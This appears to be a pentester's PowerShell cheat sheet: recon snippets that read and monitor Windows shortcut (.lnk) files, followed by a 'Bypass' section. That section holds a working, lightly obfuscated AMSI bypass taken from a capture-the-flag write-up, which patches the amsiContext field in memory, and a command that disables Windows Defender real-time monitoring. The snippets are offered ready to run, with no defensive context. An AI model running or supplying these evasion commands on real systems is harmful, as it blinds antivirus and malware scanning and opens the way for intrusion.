# Util Powershell

## Recon

### Get Details About File

```powershell
ls -Filter *.lnk | % {
    $lnkPath = $_.FullName
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($lnkPath)
    
    [PSCustomObject]@{
        ShortcutPath = $lnkPath
        TargetPath   = $shortcut.TargetPath
        Arguments    = $shortcut.Arguments
        Description  = $shortcut.Description
        WorkingDirectory = $shortcut.WorkingDirectory
        IconLocation = $shortcut.IconLocation
    }

    $shortcutInfo.PSObject.Properties | % { Write-Output "$($_.Name): $($_.Value)" }
    Write-Output ""
}
```

### Watch File Changes

```powershell
$directory = "C:\Common Applications"
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = $directory
$watcher.Filter = "*.lnk"
$watcher.IncludeSubdirectories = $true
$watcher.NotifyFilter = [System.IO.NotifyFilters]'FileName, LastAccess'
$accessLog = @{}
$action = {
    $filePath = $eventArgs.FullPath
    if ($accessLog.ContainsKey($filePath)) { $accessLog[$filePath]++ } else { $accessLog[$filePath] = 1 }
}
Register-ObjectEvent $watcher 'Changed' -Action $action
Register-ObjectEvent $watcher 'Created' -Action $action
Register-ObjectEvent $watcher 'Deleted' -Action $action
Register-ObjectEvent $watcher 'Renamed' -Action $action
$watcher.EnableRaisingEvents = $true
Write-Output "Monitoring .lnk file access in $directory for 2 minutes..."
Start-Sleep -Seconds 120
Write-Output "Total .lnk file accesses in 2 minutes:"
foreach ($file in $accessLog.Keys) {
    Write-Output "File: $file, Access Count: $($accessLog[$file])"
}
Unregister-Event -SourceIdentifier * -ErrorAction SilentlyContinue
$watcher.Dispose()
```

## Bypass

### Bypass AMSI

```powershell
# Author: Axura  
# URL: https://4xura.com/ctf/htb-writeup-mist/#toc-head-4  
  
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'} 
$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'} 
[IntPtr]$c = $b.GetValue($null) 
[Int32[]]$d = @(0xff) 
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
```

### Disable Defender

Source: [www.liberiangeek.net/2023/11/how-to-disable-windows-defender-using-powershell/](www.liberiangeek.net/2023/11/how-to-disable-windows-defender-using-powershell/)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

